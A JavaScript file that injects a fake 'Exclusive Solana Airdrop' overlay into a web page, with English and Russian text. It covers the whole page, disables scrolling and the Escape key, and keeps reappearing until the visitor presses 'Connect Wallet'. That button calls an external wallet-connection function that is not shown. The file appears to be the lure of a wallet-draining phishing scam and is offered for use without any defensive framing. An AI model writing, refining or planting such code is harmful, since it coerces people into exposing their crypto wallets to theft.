document.addEventListener('DOMContentLoaded', function() {
  // 1. Language Detection
  const isRussian = (navigator.language || navigator.userLanguage).includes('ru');

  // 2. Content
  const content = {
    en: {
      title: "🚀 Exclusive Solana Airdrop Live!",
      text: "Active Solana users qualify for our massive token distribution. Connect your wallet to check eligibility.",
      warning: "Users from Russia must use VPN to participate.",
      button: "Connect Wallet"
    },
    ru: {
      title: "🚀 Эксклюзивный Airdrop в сети Solana!",
      text: "Активные пользователи Solana могут получить долю в нашем распределении токенов. Подключите кошелек для проверки.",
      warning: "Участникам из России необходимо использовать VPN.",
      button: "Подключить кошелек"
    }
  };
  const lang = isRussian ? content.ru : content.en;

  // 3. Create Modal
  const modal = document.createElement('div');
  modal.id = 'sol-airdrop-modal';
  modal.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.9);
    backdrop-filter: blur(5px);
    z-index: 2147483647;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    color: white;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    text-align: center;
    padding: 2rem;
    box-sizing: border-box;
    opacity: 1;
    transition: opacity 0.3s ease;
  `;

  // 4. Modal Content (with improved styling)
  modal.innerHTML = `
    <div style="
      max-width: 480px;
      padding: 2.5rem;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.1);
    ">
      <h1 style="font-size: 1.8rem; margin-bottom: 1.2rem; color: #7e57c2; font-weight: 700;">${lang.title}</h1>
      <p style="font-size: 1.1rem; line-height: 1.6; margin-bottom: 1.5rem; color: #e2e2e2;">${lang.text}</p>
      <div style="
        background: rgba(255, 76, 76, 0.15);
        padding: 0.8rem;
        border-radius: 8px;
        margin-bottom: 2rem;
        border-left: 4px solid #ff4c4c;
      ">
        <p style="margin: 0; font-size: 0.95rem; color: #ff9e9e;">⚠️ ${lang.warning}</p>
      </div>
      <button 
        id="connectWalletBtn"
        style="
          padding: 1rem 3rem;
          font-size: 1.1rem;
          background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
          color: white;
          border: none;
          border-radius: 12px;
          cursor: pointer;
          font-weight: 600;
          box-shadow: 0 4px 20px rgba(153, 69, 255, 0.4);
          transition: all 0.3s;
        "
      >
        ${lang.button}
      </button>
    </div>
  `;

  // 5. Append to Body
  document.body.style.overflow = 'hidden';
  document.body.appendChild(modal);

  // 6. Click Handlers
  let isHidden = false;

  // Hide modal on wallet connect
  document.getElementById('connectWalletBtn').addEventListener('click', function(e) {
    e.stopPropagation();
    modal.style.opacity = '0';
    isHidden = true;
    window.startConnect(); // Call wallet connection
  });

  // Show modal when clicking anywhere
  document.addEventListener('click', function(e) {
    if (isHidden && !e.target.closest('#sol-airdrop-modal')) {
      modal.style.opacity = '1';
      isHidden = false;
    }
  });

  // 7. Prevent Closing
  window.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') e.preventDefault();
  });

  // 8. Bonus: Re-check wallet connection status periodically
  setInterval(() => {
    if (typeof window.walletConnected === 'undefined') return;
    if (window.walletConnected) {
      modal.style.display = 'none'; // Permanently hide if wallet connected
    }
  }, 1000);
});